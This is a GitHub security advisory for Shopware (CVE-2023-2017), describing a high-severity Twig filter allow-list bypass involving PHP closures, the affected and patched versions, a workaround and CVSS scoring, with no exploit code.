[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fshopware%2Fshopware%2Fsecurity%2Fadvisories%2FGHSA-7v2v-9rm4-7m8f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=shopware%2Fshopware)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[shopware](/shopware)
/
**[shopware](/shopware/shopware)**
Public

* [Notifications](/login?return_to=%2Fshopware%2Fshopware) You must be signed in to change notification settings
* [Fork
  1k](/login?return_to=%2Fshopware%2Fshopware)
* [Star
   2.9k](/login?return_to=%2Fshopware%2Fshopware)

* [Code](/shopware/shopware)
* [Issues
  783](/shopware/shopware/issues)
* [Pull requests
  134](/shopware/shopware/pulls)
* [Discussions](/shopware/shopware/discussions)
* [Actions](/shopware/shopware/actions)
* [Projects
  0](/shopware/shopware/projects)
* [Security](/shopware/shopware/security)
* [Insights](/shopware/shopware/pulse)

Additional navigation options

* [Code](/shopware/shopware)
* [Issues](/shopware/shopware/issues)
* [Pull requests](/shopware/shopware/pulls)
* [Discussions](/shopware/shopware/discussions)
* [Actions](/shopware/shopware/actions)
* [Projects](/shopware/shopware/projects)
* [Security](/shopware/shopware/security)
* [Insights](/shopware/shopware/pulse)

# Improper Control of Generation of Code in Twig rendered views

High

[shyim](/shyim)
published
GHSA-7v2v-9rm4-7m8f
Apr 17, 2023

## Package

composer

shopware/core
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

<= 6.4.20.0

## Patched versions

6.4.20.1

composer

shopware/platform
([Composer](/advisories?query=ecosystem%3Acomposer))

<= 6.4.20.0

6.4.20.1

## Description

### Impact

We fixed with [CVE-2023-22731](https://github.com/shopware/platform/security/advisories/GHSA-93cw-f5jj-x85w) Twig filters to only be executed with allowed functions. It is possible to pass PHP Closures as string or an array and array crafted PHP Closures was not checked against allow list

### Patches

The problem has been fixed with 6.4.20.1 with an improved override.

### Workarounds

For older versions of 6.1, 6.2, and 6.3, corresponding security measures are also available via a plugin. For the full range of functions, we recommend updating to the latest Shopware version.

### References

<https://docs.shopware.com/en/shopware-6-en/security-updates/security-update-04-2023?category=security-updates>

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2023-2017

### Weaknesses

[CWE-1336](/advisories?query=cwe%3A1336)

### Credits

* [![@Creastery](https://avatars.githubusercontent.com/u/760437?s=40&v=4)](/Creastery)
  [Creastery](/Creastery)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


